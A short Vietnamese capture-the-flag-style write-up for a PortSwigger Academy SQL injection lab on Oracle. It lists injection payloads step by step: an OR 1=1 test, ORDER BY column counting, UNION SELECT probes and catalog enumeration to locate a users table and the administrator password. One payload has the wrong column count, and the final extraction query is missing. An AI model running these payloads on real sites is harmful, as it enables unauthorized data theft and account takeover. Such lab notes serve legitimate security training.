![[Pasted image 20260604130308.png]]
# Tổng quan về lab
-Đầu tiên ta truy cập vào lab sử dụng các chứng năng như một client.Khi bấm vào Gifts thì ta thấy ở url:
```LINK
https://0a4000a40431b62780050890009800ef.web-security-academy.net/filter?category=Gifts
```
Ta thấy phần `category=Gifts` thì có vẻ nó là lỗi về SQLi,ta thử `' OR 1=1--` rồi URL encode:
```LINK
https://0a4000a40431b62780050890009800ef.web-security-academy.net/filter?category=Gifts%27+OR+1=1--
```
Ta thấy nó hiện thêm các danh mục mà phần Gifts vốn không có => đây là SQLi
Mục tiêu của bài lab:lấy thông tin tên bảng,tên cột có chứa username:`administrator` và mật khẩu của nó để có thể đăng nhập bằng username:`administrator` với database lab cho là Oracle

# Khai thác
-Đầu tiên ta xác định số cột của câu truy vấn trước bằng cách dùng `' ORDER BY 1,2,3,...--`:
```LINK
https://0a4000a40431b62780050890009800ef.web-security-academy.net/filter?category=Gifts%27+ORDER+BY+1--
https://0a4000a40431b62780050890009800ef.web-security-academy.net/filter?category=Gifts%27+ORDER+BY+2--
```
-Đến khi ta dùng `' ORDER BY 3--` thì server bị lỗi Internal Server Error 
=> câu truy vấn trước là 2 cột
-Tiếp theo,ta check xem 2 cột là dùng kiểu dữ liệu gì,ta test trước với kiểu text
```SQL
' UNION SELECT 'abc','xyz' FROM dual--
```
![[Pasted image 20260604131217.png]]
=> 2 cột đều có kiểu dữ liệu text.Ta tiến hành `UNION SELECT` để solve bài lab:
```SQL
' UNION SELECT table_name FROM all_tables--
```
![[Pasted image 20260604131700.png]]
-Ta tiếp tục `Ctrl+F` tìm `Users` thì ta phát hiện ra bảng `USERS_FXFWLU` 

-Tiếp theo,ta tiếp tục `UNION SELECT` để lấy tên các cột:
```SQL
	' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS_FXFWLU'--
```
![[Pasted image 20260604132414.png]]
Ta thành công lấy được username với password của administrator.Việc còn lại của ta là đăng nhập thôi :v
![[Pasted image 20260604132530.png]]
=>solved!
